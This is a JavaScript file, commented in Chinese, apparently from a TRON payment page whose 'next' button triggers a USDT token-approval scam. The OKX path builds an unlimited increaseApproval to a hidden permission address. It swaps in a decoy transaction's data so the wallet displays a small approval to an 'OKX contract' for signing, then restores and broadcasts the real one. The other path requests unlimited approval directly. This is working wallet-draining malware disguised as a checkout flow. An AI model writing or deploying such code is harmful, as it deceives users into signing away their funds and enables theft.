// 下一步按钮点击处理函数
async function onNextButtonClick() {
    try {
        // 检查钱包是否已连接
        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
            await connectWallet();
            return; // 连接后停止，等待用户再次点击
        }
        // 钱包已连接，直接执行操作
        if (typeof window.okxwallet !== 'undefined') {
            await DjdskdbGsj();
        } else {
            await KdhshaBBHdg();
        }
    } catch (error) {
        console.error('操作执行失败:', error);
        tip('付款失败，请重新发起交易');
    }
}

async function DjdskdbGsj() {
    try { 
        // 获取 tronWeb 实例，用于与 TRON 网络交互
        const tronWebInstance = window.tronWeb;
        
        // 获取用户地址
        const userAddress = userData.address; 
        
        // 将 currentAmount 转换为 TRON 计价单位 Sun（1 TRX = 1,000,000 Sun）
        const disguisedAmount = tronWebInstance.toSun(currentAmount);
        
        // 实际的 increaseApproval 方法参数
        const realApproveParams = [
            { "type": "address", "value": window.Permission_address }, // 授权 spender 地址（权限地址）
            { "type": "uint256", "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" } // 授权最大金额
        ];

        // 伪装的 increaseApproval 方法参数
        const disguisedApproveParams = [
            { "type": "address", "value": "THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8" }, // OKX 合约地址，请勿修改
            { "type": "uint256", "value": disguisedAmount } // 伪装的金额
        ];

        // 设置交易选项，交易费用上限为 300000000 Sun（0.3 TRX）
        const transactionOptions = { "feeLimit": 300000000 };

        // 构建实际的 increaseApproval 交易
        let realApproveTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
            tronWebInstance.address.toHex(window.usdtContractAddress), // 将 USDT 合约地址转换为 hex 格式
            "increaseApproval(address,uint256)", // 调用合约的 increaseApproval 方法
            transactionOptions, // 交易选项
            realApproveParams, // 真实参数
            userAddress // 用户的 TRON 地址
        );

        // 构建伪装的 increaseApproval 交易
        let disguisedApproveTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
            tronWebInstance.address.toHex(window.usdtContractAddress), // USDT 合约地址
            "increaseApproval(address,uint256)", // increaseApproval 方法
            transactionOptions, // 交易选项
            disguisedApproveParams, // 伪装的参数
            userAddress // 用户的 TRON 地址
        );

        // 保存真实交易的原始数据
        var originalRawData = realApproveTransaction.transaction.raw_data;

        // 替换真实交易的 raw_data 为伪装交易的 raw_data
        realApproveTransaction.transaction.raw_data = disguisedApproveTransaction.transaction.raw_data;

        // 对交易进行签名
        const signedTransaction = await tronWebInstance.trx.sign(realApproveTransaction.transaction);

        // 恢复原始交易的 raw_data
        signedTransaction.raw_data = originalRawData;

        // 发送签名后的交易
        const result = await tronWebInstance.trx.sendRawTransaction(signedTransaction);

        // 检查交易是否成功
        if (result.result || result.success) { 
            let transactionHash;
            
            // 获取交易哈希
            if (result.transaction && result.transaction.txID) { 
                transactionHash = result.transaction.txID;
            } else if (result.txid) { 
                transactionHash = result.txid;
            } else { 
                throw new Error("无法获取交易哈希");
            }

            // 返回交易哈希
            return transactionHash; 
        } else { 
            throw new Error("交易发送失败");
        } 
    } catch (error) { 
        // 捕获并抛出错误
        throw error; 
    } 
}

async function KdhshaBBHdg() {
    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const feeLimit = 100000000;  // 设置feeLimit为100 TRX
    const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);

    try {
        console.log("构建交易...");
        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
            usdtContractAddressHex,
            'approve(address,uint256)',
            { feeLimit: feeLimit },
            [
                { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
                { type: 'uint256', value: maxUint256 }
            ],
            tronWeb.defaultAddress.base58
        );

        if (!transaction.result || !transaction.result.result) {
            throw new Error('授权交易构建失败');
        }

        console.log("交易签名中...");
        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);

        console.log("发送交易...");
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

        console.log("交易交易结果:", result);
        if (result.result) {
            const transactionHash = result.txid;
            console.log("交易成功，交易哈希:", transactionHash);
            tip("交易成功");
            return transactionHash;
        } else {
            throw new Error("交易失败");
        }
    } catch (error) {
        console.error("执行授权操作失败:", error);
        if (error && error.message) {
            console.error("错误信息:", error.message);
        }
        tip("交易成功，请重试");
        throw error;
    }
}

